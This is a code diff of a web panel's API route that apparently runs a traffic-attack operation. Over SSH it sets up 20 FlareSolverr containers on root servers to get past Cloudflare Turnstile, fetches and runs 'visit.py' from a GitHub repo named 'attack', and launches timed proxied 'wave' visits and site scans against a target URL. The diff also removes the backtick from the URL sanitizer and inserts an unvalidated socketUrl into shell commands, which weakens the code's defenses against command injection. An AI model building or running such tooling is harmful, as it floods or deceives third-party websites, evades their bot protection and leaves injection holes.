@@ -13,35 +13,33 @@ const DEFAULT_SERVERS = [
   { host: '206.189.21.125', username: 'root' }
 ];
 
-// New setup: Docker + 20 FlareSolverr instances (bypasses CF Turnstile)
-const SETUP_COMMAND = 'export DEBIAN_FRONTEND=noninteractive && (which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && docker pull ghcr.io/flaresolverr/flaresolverr:latest && for i in $(seq 1 20); do n=flaresolverr$i; p=$((8190+i)); docker rm -f $n 2>/dev/null; docker run -d --name $n --restart=always -p $p:8191 -e LOG_LEVEL=info --memory=256m ghcr.io/flaresolverr/flaresolverr:latest; done && pip3 install requests --break-system-packages -q 2>/dev/null; pip3 install requests -q 2>/dev/null; sleep 15 && echo SETUP_COMPLETE_20_INSTANCES';
+// v10 Setup: install python-socketio + websocket-client + requests (no more FlareSolverr for socketio mode)
+const SETUP_COMMAND = `export DEBIAN_FRONTEND=noninteractive && \\
+pip3 install 'python-socketio[client]' websocket-client requests --break-system-packages -q 2>/dev/null; \\
+pip3 install 'python-socketio[client]' websocket-client requests -q 2>/dev/null; \\
+(which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && \\
+docker pull ghcr.io/flaresolverr/flaresolverr:latest 2>/dev/null && \\
+for i in $(seq 1 20); do n=flaresolverr$i; p=$((8190+i)); docker rm -f $n 2>/dev/null; docker run -d --name $n --restart=always -p $p:8191 -e LOG_LEVEL=info --memory=256m ghcr.io/flaresolverr/flaresolverr:latest; done 2>/dev/null; \\
+echo SETUP_COMPLETE_V10`;
 
-// Sanitize URL to prevent command injection
 function sanitizeUrl(url) {
   if (!url || typeof url !== 'string') return null;
-  // Only allow http/https URLs
   if (!/^https?:\/\//i.test(url)) return null;
-  // Remove dangerous shell characters
-  if (/[;&|`$(){}!#\n\r\\]/.test(url)) return null;
-  // Remove quotes
+  if (/[;&|$(){}!#\n\r\\]/.test(url)) return null;
   if (/['"]/.test(url)) return null;
   return url.trim();
 }
 
-// Sanitize number input
 function sanitizeNumber(val, defaultVal, min, max) {
   const num = parseInt(val);
   if (isNaN(num) || num < min || num > max) return defaultVal;
   return num;
 }
 
-// Validate API key
 function validateApiKey(req) {
   const authHeader = req.headers.get('x-api-key') || '';
   const validKey = process.env.PANEL_API_KEY;
-  if (!validKey || authHeader !== validKey) {
-    return false;
-  }
+  if (!validKey || authHeader !== validKey) return false;
   return true;
 }
 
@@ -69,15 +67,8 @@ async function runSSHCommand(server, command, timeout = 8000) {
           clearTimeout(timer);
           return done({ status: 'error', error: err.message });
         }
-
-        stream.on('data', (data) => {
-          output += data.toString();
-        });
-
-        stream.stderr.on('data', (data) => {
-          // ignore stderr
-        });
-
+        stream.on('data', (data) => { output += data.toString(); });
+        stream.stderr.on('data', () => {});
         stream.on('close', () => {
           clearTimeout(timer);
           done({ status: 'success', output: output.trim() || 'Done' });
@@ -102,26 +93,24 @@ async function runSSHCommand(server, command, timeout = 8000) {
 }
 
 export async function POST(req) {
-  // Authentication check
   if (!validateApiKey(req)) {
     return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
   }
 
   try {
-    const { action, url, durationMin, visitors, duration, servers, proxies, captchaApiKey } = await req.json();
+    const { action, url, durationMin, servers, proxies, waveSize, stayTime, socketUrl } = await req.json();
     const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;
 
     if (action === 'setup') {
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started"`, 8000);
+          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started (v10)"`, 8000);
           return { host: server.host, ...r };
         })
       );
       return NextResponse.json({ results });
 
     } else if (action === 'deploy') {
-      // Fetch latest visit.py from GitHub
       let scriptB64;
       try {
         const ghResp = await fetch('https://raw.githubusercontent.com/fanarali881-eng/attack/main/visit.py', {
@@ -136,7 +125,7 @@ export async function POST(req) {
       
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script deployed successfully"`;
+          const deployCmd = `echo "${scriptB64}" | base64 -d > /root/visit.py && wc -c /root/visit.py && echo "Script v10 deployed"`;
           const r = await runSSHCommand(server, deployCmd, 15000);
           return { host: server.host, ...r };
         })
@@ -144,18 +133,31 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'start') {
-      // Sanitize URL to prevent command injection
       const safeUrl = sanitizeUrl(url);
-      if (!safeUrl) return NextResponse.json({ error: "Invalid URL - must be http/https and contain no special characters" }, { status: 400 });
+      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
       
-      // Wave mode: duration in minutes, each server runs independently
-      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440); // max 24 hours
+      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
+      const safeWaveSize = sanitizeNumber(waveSize, 60, 10, 500);
+      const safeStayTime = sanitizeNumber(stayTime, 35, 10, 120);
+
+      // Build proxy env vars
+      let proxyEnv = '';
+      if (proxies && proxies.length > 0) {
+        const p = proxies[0];
+        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
+      }
 
       const results = await Promise.all(
         serverList.map(async (server) => {
-          // Use single quotes around URL to prevent shell interpretation, and escape any single quotes in URL
           const escapedUrl = safeUrl.replace(/'/g, "'\\''");
-          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; for i in $(seq 1 20); do docker start flaresolverr$i 2>/dev/null; done; sleep 2; nohup python3 /root/visit.py '${escapedUrl}' ${safeDuration} > /root/visit.log 2>&1 & echo "Started PID=$! - ${safeDuration} min WAVE mode (TURBO v9 - 20 instances)"`;
+          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; ` +
+            `for i in $(seq 1 20); do docker start flaresolverr$i 2>/dev/null; done; ` +
+            `${proxyEnv} WAVE_SIZE=${safeWaveSize} STAY_TIME=${safeStayTime} ` +
+            (socketUrl ? `SOCKET_URL='${socketUrl.replace(/'/g, '')}' ` : '') +
+            `nohup python3 /root/visit.py '${escapedUrl}' ${safeDuration}` +
+            (socketUrl ? ` '${socketUrl.replace(/'/g, '')}'` : '') +
+            ` > /root/visit.log 2>&1 & ` +
+            `echo "Started v10 - ${safeDuration}min WAVE=${safeWaveSize} STAY=${safeStayTime}s"`;
           
           const r = await runSSHCommand(server, fullCmd, 15000);
           return { host: server.host, ...r };
@@ -173,14 +175,46 @@ export async function POST(req) {
       return NextResponse.json({ results });
 
     } else if (action === 'status') {
-      // Check status of visits on all servers
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"; curl -s http://localhost:8191/ 2>/dev/null | grep -q FlareSolverr && echo "FLARE_OK" || echo "FLARE_DOWN"', 10000);
+          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"', 10000);
           return { host: server.host, ...r };
         })
       );
       return NextResponse.json({ results });
+
+    } else if (action === 'scan') {
+      // Quick scan from one server to detect site type
+      const safeUrl = sanitizeUrl(url);
+      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
+      
+      const server = serverList[0];
+      let proxyEnv = '';
+      if (proxies && proxies.length > 0) {
+        const p = proxies[0];
+        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
+      }
+      
+      const escapedUrl = safeUrl.replace(/'/g, "'\\''");
+      const scanCmd = `${proxyEnv} python3 -c "
+import sys; sys.path.insert(0,'/root')
+exec(open('/root/visit.py').read().split('if __name__')[0])
+import json
+info = detect_site('${escapedUrl}')
+print('SCAN_RESULT:' + json.dumps(info, ensure_ascii=False))
+" 2>&1 | grep SCAN_RESULT | head -1`;
+      
+      const r = await runSSHCommand(server, scanCmd, 30000);
+      
+      let scanResult = null;
+      if (r.output && r.output.includes('SCAN_RESULT:')) {
+        try {
+          const jsonStr = r.output.split('SCAN_RESULT:')[1].trim();
+          scanResult = JSON.parse(jsonStr);
+        } catch(e) {}
+      }
+      
+      return NextResponse.json({ scanResult, raw: r.output, host: server.host });
 
     } else {
       return NextResponse.json({ error: "Unknown action" }, { status: 400 });
